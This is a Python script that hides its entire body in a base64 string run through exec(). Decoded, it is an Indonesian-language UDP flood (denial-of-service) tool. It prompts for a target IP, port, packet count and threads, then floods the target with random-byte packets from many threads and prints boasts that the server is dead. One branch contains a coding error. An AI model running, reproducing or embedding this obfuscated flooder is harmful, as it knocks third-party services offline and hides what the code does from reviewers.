import base64
exec(base64.b64decode('aW1wb3J0IHJhbmRvbSAKaW1wb3J0IHNvY2tldAppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBvcyxzeXMKCm9zLnN5c3RlbSgiY2xlYXIiKQpwcmludCgnJycKICAgIFRPT0xTIEJZIDogWlggCiAgX19fX18gICAgICAgIF9fICBfXyAgICAgX19fX18KIHxfXyAgL19fXyAgX19fXCBcLyAvICAgX3xfXyAgLwogICAvIC8vIF8gXC8gXyBcXCAgLyB8IHwgfCAvIC8gCiAgLyAvfCAgX18vICBfXy8vICBcIHxffCB8LyAvXyAKIC9fX19fXF9fX3xcX19fL18vXF9cX18sIC9fX19ffAogICAgICAgICAgICAgICAgICAgIHxfX18vICAgICAgJycnKQpwcmludCgiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpCnByaW50KCJET05UUyBBQlVTRSBUT09MUyIpCnByaW50KCJKT0lOIE1ZIENPTU1VTklUWSIpCnByaW50KCJMSU5LIENPTU1VTklUWT8iKQpwcmludCgiUE0gR1VBIikKcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKQppcCA9IHN0cihpbnB1dCgiSVAgVEFSR0VUOiIpKQpwb3J0ID0gaW50KGlucHV0KCJQT1JUIFRBUkdFVDoiKSkKY2hvaWNlID1zdHIoaW5wdXQoIllBS0lOIE1BVSBOWUVSQU5HPyh5L24pOiIpKQp0aW1lcyA9IGludChpbnB1dCgiUEFDS0VUOiIpKQp0aHJlYWRzID0gaW50KGlucHV0KCJJU0kgUEFDS0VUOiIpKQoKb3Muc3lzdGVtKCJjbGVhciIpCmRlZiBydW4oKToKICAgIGRhdGEgPXJhbmRvbS5fdXJhbmRvbSgxMDMwKQogICAgaSA9IHJhbmRvbS5jaG9pY2UoKCJcMDMzWzk1bVtaWF0gKE1FTkdJUklNIFBBS0VUIERBTikiLCJcMDMzWzk1bVtaWF0gKE1FTkdJUklNIFBBS0VUIERBTikiLCJcMDMzWzk1bVtaWF0gKE1FTkdJUklNIFBBS0VUIERBTikiKSkKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCiAgICAgICAgICAgIGFkZHIgPSAoc3RyKGlwKSxpbnQocG9ydCkpCiAgICAgICAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToKICAgICAgICAgICAgICAgIHMuc2VuZHRvKGRhdGEsYWRkcikKICAgICAgICAgICAgcHJpbnQoaSArIlwwMzNbOTFtIE1FTUJBTlRBSSBJUCBcMDMzWzBtJXMgXDAzM1s5MW1NRU5JTkRBUyBQT1JUIFwwMzNbMG0lcyIlKGlwLCBwb3J0KSkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KCJb4oCiXSBVREFIIE1UIEJBTkcgU0VSVkVSIE5ZQSEhISIpCgpkZWYgcnVuMigpOgogICAgZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgxMDApCiAgICBpID0gcmFuZG9tLmNob2ljZSgoIlwwMzNbOTVtW1pYXSAoTUVOR0lSSU0gUEFLRVQgREFOKSIsIlwwMzNbOTVtW1pYXSAoTUVOR0lSSU0gUEFLRVQgREFOKSIsIlwwMzNbOTVtW1pYXSAoTUVOR0lSSU0gUEFLRVQgREFOKSIpKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkKICAgICAgICAgICAgcy5jb25uZWN0KChpcCxwb3J0KSkKICAgICAgICAgICAgcy5zZW5kKGRhdGEpCiAgICAgICAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToKICAgICAgICAgICAgICAgIHMuc2VuZChkYXRhKQogICAgICAgICAgICBwcmludChpICsiXDAzM1s5MW0gTUVNQkFOVEFJIElQIFwwMzNbMG0lcyBcMDMzWzkxbU1FTklOREFTIFBPUlQgXDAzM1swbSVzIiUoaXAsIHBvcnQpKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcy5jbG9zZSgpCiAgICAgICAgICAgIHByaW50KCJb4oCiXSBVREFIIE1UIEJBTkcgU0VSVkVSIE5ZQSEhISIpCgpkZWYgcnVuMygpOgogICAgZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgyMCkKICAgIGkgPSByYW5kb20uY2hvaWNlKCgiXDAzM1s5NW1bWlhdIChNRU5HSVJJTSBQQUtFVCBEQU4pIiwiXDAzM1s5NW1bWlhdIChNRU5HSVJJTSBQQUtFVCBEQU4pIiwiXDAzM1s5NW1bWlhdIChNRU5HSVJJTSBQQUtFVCBEQU4pIikpCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQogICAgICAgICAgICBzLmNvbm5lY3QoKGlwLHBvcnQpKQogICAgICAgICAgICBzLnNlbmQoZGF0YSkKICAgICAgICAgICAgZm9yIHggaW4gcmFuZ2UodGltZXMpOgogICAgICAgICAgICAgICAgcy5zZW5kKGRhdGEpCiAgICAgICAgICAgIHByaW50KGkgKyJcMDMzWzkxbSBNRU1CQU5UQUkgSVAgXDAzM1swbSVzIFwwMzNbOTFtTUVOSU5EQVMgUE9SVCBcMDMzWzBtJXMiJShpcCwgcG9ydCkpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzLmNsb3NlKCkKICAgICAgICAgICAgcHJpbnQoIlvigKJdIFVEQUggTVQgQkFORyBTRVJWRVIgTllBISEhIikKCmZvciB5IGluIHJhbmdlKHRocmVhZHMpOgogICAgaWYgY2hvaWNlID09ICd5JzoKICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuKQogICAgICAgIHRoLnN0YXJ0KCkKICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuMikKICAgICAgICB0aC5zdGFydCgpCiAgICBlbHNlOgogICAgICAgIHRoLnRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuMyk='))